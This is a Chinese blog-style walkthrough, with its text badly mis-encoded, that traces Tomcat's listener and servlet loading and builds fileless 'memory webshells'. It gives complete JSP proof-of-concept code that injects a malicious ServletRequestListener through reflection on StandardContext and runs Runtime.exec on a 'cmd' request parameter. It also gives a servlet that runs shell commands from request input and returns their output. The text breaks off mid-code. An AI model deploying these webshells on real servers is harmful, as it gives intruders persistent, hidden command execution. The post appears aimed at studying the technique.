è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œtomcatåœ¨å¯åŠ¨åº”ç”¨çš„æ—¶å€™ï¼ŒContextConfigç±»ä¼šå»è¯»å–é…ç½®æ–‡ä»¶ã€‚\næ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»ContextConfigç±»é‡Œé¢å»çœ‹ä¸€ä¸‹ï¼Œç›´æ¥å®šä½åˆ°ä¸€ä¸ªæ–¹æ³•ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œè¯»å–äº†webxmlã€‚\nè¿™ä¸ªæ–¹æ³•ä¸»è¦å°±æ˜¯è¯»å–æ•°æ®ï¼Œç®€å•çœ‹çœ‹å…¶ä¸­çš„æ–¹æ³•ï¼Œè¯»å–äº†filterç­‰ç»„ä»¶ï¼š\nè°ƒç”¨äº†addFilterDef()æ–¹æ³•æ¥æ”¾å…¥è¯»å–å‡ºæ¥çš„filterDefã€‚\nâ€”â€”â€”â€”\nåœ¨è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨listenerçš„è¯»å–ï¼Œç›´æ¥å…³é”®å­—æœç´¢å‘ç°æœ‰å¦‚ä¸‹æ–¹æ³•ï¼š\næ‰“æ–­ç‚¹çœ‹ä¸€ä¸‹è¿™é‡Œçš„å‚æ•°æƒ…å†µï¼š è¿™é‡Œçš„contextç¡®å®æ˜¯StandardContextçš„å®ä¾‹ï¼Œå¹¶ä¸”è¿™é‡Œçš„webxmlç¡®å®æ˜¯æœ‰æˆ‘ä»¬è‡ªå®šä¹‰çš„listenerçš„ï¼š æ­£å¥½å¯¹åº”äº†æˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨web.xmlä¸­å®šä¹‰filterï¼Œæ‰€ä»¥è¿™æ˜¯å°±æ˜¯è¯»å–çš„æˆ‘ä»¬è‡ªå®šä¹‰çš„web.xmlä¸­çš„æ•°æ®ã€‚\nâ€”â€”â€”â€”\nä¸Šè¿°å°±æ˜¯è¯»å–é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢åŠ è½½äº†Listenerã€‚åœ¨è¯»å–å®Œé…ç½®æ–‡ä»¶åï¼Œä¸­é—´è¿˜æœ‰ä¸€å¤§éƒ¨åˆ†è¿‡ç¨‹ç•¥è¿‡ï¼Œæœ€åä¼šè°ƒç”¨StandardContextçš„listenerStart()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åšäº†ä¸€äº›åŸºç¡€çš„å®‰å…¨æ£€æŸ¥ï¼Œç„¶åå®Œæˆstartä¸šåŠ¡ã€‚\nåº”ç”¨è¿è¡Œè¿‡ç¨‹ æˆ‘ä»¬ç›´æ¥æ‰“æ–­ç‚¹è‡ªå®šä¹‰listener()æ–¹æ³•çš„requestInitialized()æ–¹æ³•ï¼Œç„¶åè°ƒè¯•ï¼š\næ¥çœ‹ç°åœ¨çš„è°ƒç”¨æ ˆï¼š å®šç‚¹äºæ ‡é‡ç‚¹éƒ¨åˆ†ï¼Œè°ƒç”¨çš„fireRequestInitEvent()æ–¹æ³•ï¼š\nè¿™é‡Œå°±è°ƒç”¨åˆ°äº†requestInitialized()æ–¹æ³•ã€‚\nåœ¨è¿™ä¸ªfireRequestInitEvent()æ–¹æ³•æœ€å¼€å§‹çš„åœ°æ–¹è°ƒç”¨äº†ä¸€ä¸ªgetApplicationEventListeners()æ–¹æ³•ï¼š\nè¿™ä¸ªæ–¹æ³•å°±æ˜¯è·å–æ‰€æœ‰çš„Listenerå¯¹è±¡ï¼Œæ‰“æ–­ç‚¹æ¥çœ‹ä¸€ä¸‹ï¼š è·å–åˆ°äº†æˆ‘è‡ªå®šä¹‰çš„Listenerç±»ã€‚\nå¦‚æœæœ‰å¤šä¸ªlistenerï¼Œä»£ç åœ¨åé¢ä¹Ÿæ˜¯ä½¿ç”¨äº†forå¾ªç¯æ¥åˆ†åˆ«åˆå§‹åŒ–Listenerã€‚\nå¹¶ä¸”åœ¨è¿™ä¸ªStandardContextä¸­ï¼š\nå‰é¢é‚£ä¸ªgetApplicationEventListeners()æ–¹æ³•å…¶å®å¯ä»¥ç®—ä½œæ˜¯listenerçš„â€getteræ–¹æ³•â€œï¼Œ\nå¹¶ä¸”StandardContextç±»è¿˜æä¾›äº†â€œsetteræ–¹æ³•â€ï¼ŒsetApplicationEventListeners()ï¼š\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å‘StandardContextçš„å˜é‡applicationEventListenersListä¸­æ·»åŠ ä¸€ä¸ªæ¶æ„Listenerã€‚\næ³¨å…¥è¿‡ç¨‹ å…ˆè·å–å½“å‰ç¯å¢ƒçš„StandardContextå¯¹è±¡ï¼š\n1 2 3 4 5 6 7 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); å‡†å¤‡ä¸€ä¸ªæ¶æ„Listenerï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;é”€æ¯\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; ä¸¤ä¸ªç‚¹è¯´æ˜ä¸€ä¸‹ï¼š\nbadListener ä¸ºä»€ä¹ˆæ˜¯ServletRequestListenerå‹ è¿˜æ˜¯ä»fireRequestInitEvent()æ–¹æ³•è¯´æ˜ï¼š\nå·²ç»å¾ˆå¥½ç†è§£äº†ï¼Œinstanceså³listenerâ€œåˆé›†â€ï¼Œè¿™é‡Œifåˆ¤æ–­å¿…é¡»æ˜¯ServletRequestListenerå‹æ‰èƒ½æˆåŠŸè°ƒç”¨åˆ°listenerä¸­çš„requestInitialized()æ–¹æ³•ã€‚\nlistenerä¸­è¿˜å®ç°äº†ä¸€æ¬¡ç±»å‹è½¬æ¢ è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºServletRequestä¸€èˆ¬æˆ‘ä»¬åˆ©ç”¨çš„requestå°±æ˜¯è¿™ä¸ªç±»å‹ã€‚åœ¨è¿™é‡Œè°ƒç”¨çš„ServletRequestEventç±»çš„getServletRequest()æ–¹æ³•å¦‚ä¸‹ï¼š å°±æ˜¯è·å–çš„ServletRequestç±»å‹çš„requestã€‚\næ³¨å…¥æ¶æ„ä»£ç ï¼š\nè¿™é‡Œå°±æ˜¯åˆ©ç”¨å‰é¢è¯´è¿‡çš„setApplicationEventListeners()æ–¹æ³•ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ–¹æ³•æ¥æ”¶ä¸€ä¸ªObjectæ•°ç»„ï¼š æ‰€ä»¥éœ€è¦å°†badListenerè®¾ç½®ä¸ºæ•°ç»„å½¢å¼ç›´æ¥å°†å‰é¢è®¾è®¡å¥½çš„listeneråŠ è¿›å»å³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //è·å–StandardContextå¯¹è±¡ ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //ç¼–å†™æ¶æ„listener ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;é”€æ¯\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; //æ³¨å…¥æ¶æ„ä»£ç  standardContext.setApplicationEventListeners(new Object[]{badListener}); è¿˜æœ‰çš„å°±æ˜¯æˆ‘çœ‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œæ³¨å…¥æ¶æ„listeneræ—¶å¥½åƒéƒ½æ˜¯ç”¨çš„addApplicatioinEventListener()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š åªæ˜¯æˆ‘è¿™é‡Œç”¨çš„setApplicationEventListeners()ï¼š æœ€ç»ˆPOC åŠ å…¥åˆ°jspä¸­å°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% //è·å–StandardContextå¯¹è±¡ ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //ç¼–å†™æ¶æ„listener ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;é”€æ¯\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; //æ³¨å…¥æ¶æ„ä»£ç  standardContext.setApplicationEventListeners(new Object[]{badListener}); //æç¤º out.println(\u0026#34;æ³¨å…¥æˆåŠŸ\u0026#34;); %\u0026gt; ç„¶åè®¿é—®injection.jspï¼š æˆåŠŸæ³¨å…¥ï¼Œå†éšä¾¿è¯·æ±‚èµ„æºåŠ ä¸Šå‚æ•°ï¼š æˆåŠŸå‘½ä»¤æ‰§è¡Œã€‚\nâ€”â€”â€”â€”â€”â€”\nå¦‚æœç”¨addApplicationEventListener()æ–¹æ³•çš„è¯å°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% //è·å–StandardContextå¯¹è±¡ ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //ç¼–å†™æ¶æ„listener ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;é”€æ¯\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; //æ³¨å…¥æ¶æ„ä»£ç  standardContext.addApplicationEventListener(badListener); //æç¤º out.println(\u0026#34;æ³¨å…¥æˆåŠŸ\u0026#34;); %\u0026gt; è¿˜æ˜¯å…ˆè®¿é—®jspæ–‡ä»¶ï¼Œå†è¯·æ±‚èµ„æºå¹¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š æˆåŠŸæ‰§è¡Œã€‚\nSevletå‹å†…å­˜é©¬ åŒæ ·çš„ä»¥ä¸€ä¸ªç®€å•çš„servletæ¥åˆ†æä¸€ä¸‹æµç¨‹ã€‚\nweb.xmlï¼š\n1 2 3 4 5 6 7 8 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;Servlet.ServletTest\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; ServletTest.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package Servlet; import javax.servlet.*; import java.io.IOException; import java.util.Scanner; import java.io.InputStream; import java.io.PrintWriter; import javax.servlet.annotation.WebServlet; @WebServlet(value = \u0026#34;/servlet\u0026#34;,name = \u0026#34;ServletTest\u0026#34;) public class ServletTest implements Servlet { public void init(ServletConfig var1) throws ServletException{ } public ServletConfig getServletConfig(){ return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(\u0026#34;servletå¯åŠ¨\u0026#34;); String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo(){ return null; } public void destroy(){ } } æ‰§è¡Œä¸€ä¸‹å¯ä»¥æˆåŠŸè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š\nè¿™é‡Œçš„ç»§æ‰¿å…³ç³»ï¼š\n1 2 3 4 5 6 7 Interface Servlet, ServletConfig â†“ abstract class GenericServlet â†“ class HttpServlet â†“ è‡ªå®šä¹‰ Servlet è°ƒè¯•åˆ†æ ï¼ˆè¿™é‡Œæ”¹æˆäº†mavené¡¹ç›®æ¥å­¦ä¹ ï¼Œå°†.classæ–‡ä»¶æ”¹ä¸ºäº†.javaæ–‡ä»¶ï¼‰\nè°ƒè¯•åˆ†æservletçš„åŠ è½½è¿‡ç¨‹ åœ¨org.apache.catalins.core.StandardContextç±»çš„startInternal()æ–¹æ³•ä¸­ï¼Œé¦–å…ˆè°ƒç”¨äº†listenerStart()ï¼Œæ¥ç€æ˜¯filterStart()ï¼Œæœ€åæ˜¯loadOnstartup()ã€‚è¿™ä¸‰å¤„è°ƒç”¨è§¦å‘äº†Listenerã€Filterã€Servletçš„æ„é€ åŠ è½½ã€‚\nè¿™é‡Œä¸»è¦åˆ†æServletçš„åŠ è½½ï¼Œç°åœ¨æ‰“æ–­ç‚¹äºloadOnstartup()æ–¹æ³•\nå‰é¢ä¹Ÿè¯´è¿‡äº†ï¼Œåœ¨Containerä¸­çš„å››ä¸ªå®¹å™¨æ˜¯å­˜åœ¨çˆ¶å­å…³ç³»çš„ï¼Œè€ŒStandardContextæ˜¯Contextçš„å®ç°ç±»ï¼Œæ‰€ä»¥è¿™é‡Œå¾ˆæœ‰å¯èƒ½è¿™é‡Œçš„findChildren()æ–¹æ³•å°±æ˜¯å¯»æ‰¾wrapperï¼Œä¹Ÿå°±æ˜¯Sevletã€‚è¿›å…¥è¿™ä¸ªfindChildren()æ–¹æ³•ï¼š è¿›å…¥åˆ°äº†StandardContextç±»çš„çˆ¶ç±»ContainerBaseç±»ï¼Œchildrenå˜é‡çš„å®šä¹‰ä¸ºï¼š\nchildrenæ˜¯ä¸€ä¸ªHashMapç±»å®ä¾‹ï¼Œè¿™é‡Œè°ƒç”¨HashMapç±»çš„values()æ–¹æ³•ç”¨æ¥è·å–åˆ°HashMapä¸­çš„valueçš„é›†åˆã€‚çœ‹ä¸€ä¸‹è¿™é‡Œçš„è¾“å‡ºç»“æœï¼š\nè¿™é‡Œæœ‰ä¸‰ä¸ªï¼Œä¸€ä¸ªdefaultå’ŒJSPï¼Œåº”è¯¥éƒ½æ˜¯è‡ªå¸¦çš„ï¼Œåœ¨è¿™é‡Œè¿˜å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„ServletTestï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šè¿™é‡Œçš„childrenå°±æ˜¯å­˜å‚¨Servletçš„åœ°æ–¹ã€‚\næ‰€ä»¥è¿™é‡Œçš„findChildren()æ–¹æ³•å°±æ˜¯è·å–åˆ°Servletçš„Containerç±»å‹çš„æ•°ç»„å¹¶è¿”å›ã€‚\nâ€”â€”â€”â€”\nå†å›åˆ°loadOnStartup()æ–¹æ³•ï¼Œæ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public boolean loadOnStartup(Container children[]) { // Collect \u0026#34;load on startup\u0026#34; servlets that need to be initialized TreeMap\u0026lt;Integer,ArrayList\u0026lt;Wrapper\u0026gt;\u0026gt; map = new TreeMap\u0026lt;\u0026gt;(); for (Container child : children) { Wrapper wrapper = (Wrapper) child; int loadOnStartup = wrapper.getLoadOnStartup(); if (loadOnStartup \u0026lt; 0) { continue; } Integer key = Integer.valueOf(loadOnStartup); map.computeIfAbsent(key, k -\u0026gt; new ArrayList\u0026lt;\u0026gt;()).add(wrapper); } // Load the collected \u0026#34;load on startup\u0026#34; servlets for (ArrayList\u0026lt;Wrapper\u0026gt; list : map.values()) { for (Wrapper wrapper : list) { try { wrapper.load(); } catch (ServletException e) { getLogger().error( sm.getString(\u0026#34;standardContext.loadOnStartup.loadException\u0026#34;, getName(), wrapper.getName()), StandardWrapper.getRootCause(e)); // NOTE: load errors (including a servlet that throws // UnavailableException from the init() method) are NOT // fatal to application startup // unless failCtxIfServletStartFails=\u0026#34;true\u0026#34; is specified if (getComputedFailCtxIfServletStartFails()) { return false; } } } } return true; } é€šè¯»ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½çœ‹æ‡‚çš„ï¼š\nå…ˆå®šä¹‰ä¸€ä¸ªTreeMapç±»ï¼Œç„¶åä½¿ç”¨forå¾ªç¯éå†ä¼ å…¥çš„childrenå˜é‡ï¼Œç„¶åå¯¹å¯¹è±¡è°ƒç”¨getLoadOnStartup()æ–¹æ³•ï¼š ä¹Ÿå°±æ˜¯ç›´æ¥è¿”å›loadOnStartupï¼Œå¦‚æœloadOnStartup \u0026lt; 0ï¼Œå°±ä¼šç›´æ¥è¿›è¡Œä¸‹ä¸€ä¸ªforå¾ªç¯ï¼Œé‚£ä¹ˆè¿™é‡Œçš„loadOnstartupæ˜¯ä»€ä¹ˆï¼Ÿ\nå…¶å®å°±æ˜¯StandardWrapperç±»çš„ä¸€ä¸ªå˜é‡ï¼Œå½“æ˜¯ä¸€ä¸ªè´Ÿæ•°æˆ–è€…æ²¡æœ‰æŒ‡å®šæ—¶ï¼Œåˆ™è¡¨ç¤ºæœåŠ¡å™¨åœ¨è¯¥servletè¢«è°ƒç”¨æ—¶æ‰åŠ è½½ï¼Œæˆ‘ä»¬ç‚¹å¼€è¿™é‡Œçš„childrenï¼š\nåœ¨æœåŠ¡å™¨è‡ªå¸¦çš„servletä¸­ä¸ºï¼š\nåœ¨æˆ‘è‡ªå®šä¹‰çš„Servletä¸­ä¸ºï¼š\nå¯ä»¥çœ‹å‡ºå¦‚æœæ˜¯æˆ‘è‡ªå®šä¹‰çš„servletï¼Œé‚£ä¹ˆæ˜¯è‚¯å®šä¸ä¼šè¢«åŠ è½½çš„ã€‚ä½†æ˜¯è¿™é‡Œçš„loadOnStartupå…¶å®æ˜¯ web.xml é…ç½® Servlet æ—¶çš„ä¸€ä¸ªé…ç½®ï¼š\n1 \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; å¹¶ä¸”åœ¨StandardWrapperç±»ä¸­è¿˜æœ‰ä¸ªè®¾ç½®loadOnStartupå€¼çš„æ–¹æ³•ï¼š â€”â€”â€”â€”â€”â€”â€”â€”\nç„¶åå›åˆ°loadOnStartup()æ–¹æ³•ï¼š å¦‚æœæ¡ä»¶å…è®¸ï¼Œåˆ™ä¼šå°†è¿™ä¸ªwrapperæ”¾å…¥åˆ°ä¸€ä¸ªArrayListå‹çš„mapï¼Œå†ç„¶ååˆè°ƒç”¨forå¾ªç¯éå†è¿™ä¸ªmapå¹¶è°ƒç”¨load()æ–¹æ³•åŠ è½½ã€‚\nç»§ç»­è·Ÿè¿›è¿™ä¸ªload()æ–¹æ³•ï¼š è¿™é‡Œè°ƒç”¨äº†loadServlet()æ–¹æ³•ï¼š\né‡ç‚¹å°±æ˜¯æˆ‘æ ‡æ³¨å‡ºæ¥çš„ä¸œè¥¿ï¼Œè¿™é‡Œé€šè¿‡servletClasså˜é‡æ¥è£…è½½servletï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•æœ€åå°±æ˜¯è¿”å›è¿™ä¸ªservletã€‚\nç»§ç»­åˆ†æè¿™ä¸ªloadServlet()åç»­ä»£ç ï¼š\nåœ¨åé¢è¿˜æ‰§è¡Œäº†ä¸€æ¬¡åˆå§‹åŒ–æ“ä½œï¼š æ³¨æ„è¿™é‡Œå°†è£…è½½åçš„servletä¼ è¿›å»äº†ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªinitServlet()æ–¹æ³•ï¼š\nä¼šè°ƒç”¨servletçš„init()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±æ˜¯è‡ªå¸¦çš„DefaultServletç±»çš„init()æ–¹æ³•ï¼š å®Œæˆåˆå§‹åŒ–æ“ä½œã€‚åŒæ ·çš„å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰çš„ServletTestå¯ä»¥æ»¡è¶³loadOnStartup\u0026gt;=0ï¼Œé‚£ä¹ˆåŒæ ·çš„ä¼šè°ƒç”¨åˆ°è¿™ä¸ªinit()æ–¹æ³•ç”¨äºåˆå§‹åŒ–è¿™ä¸ªservletã€‚è‡ªå·±è¯•äº†ä¸€ä¸‹ï¼Œweb.xmlæ”¹ä¸ºå¦‚ä¸‹å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;Servlet.ServletTest\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; å¯ä»¥è‡ªå·±è°ƒè°ƒï¼Œäº²æµ‹å¯è¡Œã€‚\nâ€”â€”â€”â€”\nåœ¨è°ƒç”¨å®Œinit()æ–¹æ³•åï¼Œè¿˜æœ‰ä¸ªç‚¹è¯´æ˜ä¸€ä¸‹ï¼š åé¢è¿˜æœ‰ä¸€ä¸ªå°†è¿™ä¸ªinstanceInitializedèµ‹å€¼ä¸ºtrueçš„è¯­å¥ã€‚åœ¨å‰é¢è¿™é‡Œçš„Wrapperçš„è¿™ä¸ªå€¼éƒ½æ˜¯falseï¼Œåªæœ‰è¿™é‡Œæ‰ä¼šå°†å…¶æ”¹ä¸ºtrue\nâ€”â€”â€”â€”\nç„¶åç»§ç»­å›åˆ°load()æ–¹æ³•ï¼š è°ƒè¯•äº†ä¸€ä¸‹\nç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œä¸ä¼šè¿›å…¥ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ä¸Šé¢æ‰è¯´æ˜çš„ï¼Œæœ‰ä¸€ä¸²ä»£ç å¯¹å…¶èµ‹å€¼ï¼š æ‰€ä»¥ç¬¬ä¸€ä¸ªifè¯­å¥æ˜¯ä¸ä¼šè¿›å…¥çš„\nç¬¬äºŒä¸ªifæ¡ä»¶ä¸­çš„isJspServletå°±æ˜¯åˆ¤æ–­æ˜¯ä¸æ˜¯æœåŠ¡å™¨è‡ªå¸¦çš„JSPServletï¼Œä¸æ˜¯å°±ä¸ä¼šè¿›å…¥ã€‚ OKï¼ŒservletåŠ è½½è¿‡ç¨‹åˆ†æå®Œæ¯•ã€‚\nåœ¨ä¸Šé¢æåˆ°äº†å‡ ä¸ªé‡è¦çš„ç‚¹ï¼š\nåœ¨StardardContextè°ƒç”¨findChildren()è·å–åˆ°Containter[]ï¼Œç„¶åforå¾ªç¯éå†å¾—åˆ°wrapperï¼Œå¹¶å¯¹å…¶è¿›è¡Œload()æ“ä½œ\nåœ¨load()æ“ä½œä¸­ï¼Œæœ‰ä¸¤ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼Œä¸€ä¸ªæ˜¯è¿™ä¸ªwrapperçš„loadOnStartupéœ€è¦\u0026gt;=0\nè¿˜æœ‰ä¸ªç‚¹å°±æ˜¯åˆ©ç”¨åˆ°äº†servletClassï¼Œä½¿ç”¨è¿™ä¸ªæ–¹æ³•è·å–åˆ°äº†ç›¸å¯¹åº”çš„Servletç±»\nâ€”â€”â€”â€”â€”â€”\nè°ƒè¯•åˆ†æservletçš„åˆå§‹åŒ–è¿‡ç¨‹ åœ¨å‰é¢å…¶å®è¯´æ˜äº†æ¯”å¦‚è¦ç”¨åˆ°loadOnStartupã€servletClassç­‰å˜é‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¯´åˆ°æ€ä¹ˆå¯¹è¿™äº›å˜é‡è¿›è¡Œèµ‹å€¼ã€‚è¿™ä¸ªæ¿å—ä¸»è¦å°±æ˜¯ç”¨äºè§£å†³è¿™ä¸ªé—®é¢˜ã€‚\nåœ¨ StandardWrapper#setServletClass() æ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œå¼€å§‹è°ƒè¯•ï¼š\nå¯ä»¥çœ‹å‡ºåœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶è¿˜æ˜¯å…ˆåˆå§‹åŒ–çš„è‡ªå¸¦çš„DefaultServletï¼Œæ­¤æ—¶çš„éƒ¨åˆ†è°ƒç”¨æ ˆï¼š\næˆ‘ä»¬å›æº¯åˆ°ContextConfig#configureContext()æ–¹æ³•ï¼Œç®€å•çœ‹çœ‹ï¼ŒåŸºæœ¬å¯ä»¥çœ‹å‡ºå°±æ˜¯åœ¨è¯»å–web.xmlä¸­çš„æ•°æ®ï¼š\nè¿™é‡Œçš„contextå®šä¹‰ï¼š ä¸ªäººç†è§£å¯ä»¥å°†å…¶çœ‹ä½œcontextå®ç°ç±»StandardContextç±»çš„å®ä¾‹ã€‚\nå†çœ‹ä¸€ä¸‹å…¶ä¸­çš„ä¸€äº›æ–¹æ³•ï¼š\nå¯ä»¥çœ‹å‡ºè¿™é‡Œå°±æ˜¯åœ¨æ•´ä¸ªtomcatåˆå§‹åŒ–è¿‡ç¨‹ä¸­å¯¹filterå’Œlistenerçš„åˆå§‹åŒ–ã€‚ä½†è¿™é‡Œçš„é‡ç‚¹è¿˜æ˜¯servletï¼š è¿™é‡Œè°ƒç”¨äº†å‡ ä¸ªå…³é”®å‡½æ•°ï¼šcreateWrapper()ã€ã€setServletClass()ã€‚å…ˆæ¥çœ‹createWrapper()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œæ‰“ä¸€ä¸ªæ–­ç‚¹è°ƒè¯•ï¼Œè¿›å…¥åˆ°äº†StandardContextç±»çš„createWrapperr()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 @Override public Wrapper createWrapper() { Wrapper wrapper = null; if (wrapperClass != null) { try { wrapper = (Wrapper) wrapperClass.getConstructor().newInstance(); 